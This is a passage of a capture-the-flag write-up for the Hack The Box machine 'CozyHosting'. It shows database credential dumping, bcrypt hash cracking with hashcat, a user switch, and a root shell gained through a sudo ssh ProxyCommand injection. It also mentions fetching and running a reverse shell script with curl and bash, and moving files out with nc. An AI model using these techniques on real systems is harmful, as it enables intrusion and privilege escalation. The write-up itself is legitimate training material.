SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

cozyhosting=# 
```
We can see there are 4 databases:
```
cozyhosting-# \l
\l
WARNING: terminal is not fully functional
Press RETURN to continue 

                                   List of databases
    Name     |  Owner   | Encoding |   Collate   |    Ctype    |   Access privil
eges   
-------------+----------+----------+-------------+-------------+----------------
-------
 cozyhosting | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres    | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres    
      +
             |          |          |             |             | postgres=CTc/po
stgres
 template1   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres    
      +
             |          |          |             |             | postgres=CTc/po
stgres
(4 rows)
```
There are two tables in the database `cozyhosting`:
```
cozyhosting-# \dt
\dt
WARNING: terminal is not fully functional
Press RETURN to continue 

         List of relations
 Schema | Name  | Type  |  Owner   
--------+-------+-------+----------
 public | hosts | table | postgres
 public | users | table | postgres
(2 rows)

(END)
```
We can look into them:
```
cozyhosting=# SELECT * FROM hosts;
SELECT * FROM hosts;
WARNING: terminal is not fully functional
Press RETURN to continue 

 id | username  |      hostname      
----+-----------+--------------------
  1 | kanderson | suspicious mcnulty
  5 | kanderson | boring mahavira
  6 | kanderson | stoic varahamihira
  7 | kanderson | awesome lalande
(4 rows)

(END)q
cozyhosting=# 
cozyhosting=# SELECT * FROM users;
SELECT * FROM users;
WARNING: terminal is not fully functional
Press RETURN to continue 

   name    |                           password                           | role
  
-----------+--------------------------------------------------------------+-----
--
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admi
n
(2 rows)

(END)
```
We now have two `blowfish` hashes. Let's run `hashcat` on them to find potential passwords:
```
$hashcat -m 3200 hashes /usr/share/wordlists/rockyou.txt
```
Very quickly, I got the password for the admin:
```
$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:m[...]d
```
We can now use this password to log as `josh`:
```
app@cozyhosting:/tmp/jar$ su josh     
su josh
Password: m[...]d

josh@cozyhosting:/tmp/jar$ cd 
cd 
josh@cozyhosting:~$ ls
ls
user.txt
josh@cozyhosting:~$ cat user.txt
cat user.txt
d[...]a
```
## Privilege escalation
We can now log directly to `josh` session using SSH. That way, we can have a better shell allowing, for instance, the use of `Ctrl+C` to stop a process:
```
$ssh josh@10.129.41.158
The authenticity of host '10.129.41.158 (10.129.41.158)' can't be established.
ED25519 key fingerprint is SHA256:x/7yQ53dizlhq7THoanU79X7U63DSQqSi39NPLqRKHM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.41.158' (ED25519) to the list of known hosts.
josh@10.129.41.158's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-82-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Mar 17 10:51:32 AM UTC 2024

  System load:           0.09521484375
  Usage of /:            51.7% of 5.42GB
  Memory usage:          11%
  Swap usage:            0%
  Processes:             264
  Users logged in:       0
  IPv4 address for eth0: 10.129.41.158
  IPv6 address for eth0: dead:beef::250:56ff:fe94:3a94


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Aug 29 09:03:34 2023 from 10.10.14.41
josh@cozyhosting:~$ 
```
I started to look at the commands that the user can run with `sudo`:
```
josh@cozyhosting:~$ sudo -l
[sudo] password for josh: 
Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```
He can run any `ssh` commands as a root. Looking at [GTFOBins](https://gtfobins.github.io/gtfobins/ssh/), it appears that this can be used to get a root shell:
```
josh@cozyhosting:~$ sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
# ls /root
root.txt
# cat /root/root.txt
2[...]e
```
## Learning from other writeups
### Official writeup
In the official writeup, after enumerating the pages available on the website and getting the information that it is a Spring Boot application, they did another enumeration using a Spring Boot wordlist. In my case, I got lucky because I directly looked at the Actuator endpoint. I could miss some other endpoints. Using a dedicated wordlist can find other pages.
Then, to test there is indeed a command injection, they started a web server locally and sent a `curl` command to this server. This is easier than directly doing a reverse shell because reverse shell commands can be a bit tricky sometimes (as we saw before with the reduction issue). More interesting, they used this web server to download a reverse shell script on the server and then run it. Again, this avoids running complex commands: you just have two commands, one downloading the reverse shell with `curl`, and one executing it with `bash`.
Finally, the SSH command used to get a root shell seems much simpler to me. They used the options `PermitLocalCommand` and `LocalCommand` that run a local command after a successful connection.
### 0xdf writeup
In [0xdf writeup](https://0xdf.gitlab.io/2024/03/02/htb-cozyhosting.html), they found another way in the command injection to avoid spaces in the username: they used [brace expansion](https://www.gnu.org/software/bash/manual/html_node/Brace-Expansion.html).
Then, as in the official writeup, they used a command different than me to upgrade the shell: `script /dev/null -c bash`. This is interesting in case Python is not installed on the machine. I will add this command into my cheat sheet.
When I wanted to analyze the jar file, I first tried to send it to my machine using `scp`. `scp` is using SSH to transfer files. However, it seems there is a firewall preventing outgoing SSH connections. So it failed. In this writeup, they used `nc` to transfer the file. This is a better choice as you can also select which will be the port to use to avoid the firewall. Then, after transferring the jar file, they used a Java decompiler ([JD-GUI](https://java-decompiler.github.io/)) to analyze it.
To determine the hash type, I deduced it from the first characters `$2a$`. In this writeup, they used `hashcat` to do it, and in the official writeup, they used `hashid`. Maybe it can be interesting to verify the type of hash before running a brute-force just in case I am wrong when I deduce it.
## Lessons learned
I lost a lot of time in my vulnerability analysis because I missed one crucial point during the information gathering: I did not look at the error page in details. Indeed, the error page tells us that the website is using the framework Spring which is vulnerable if the Actuator endpoint is enabled. By missing this part, I spent a lot of time by looking everything else. Note for the future: always look at the error pages/messages.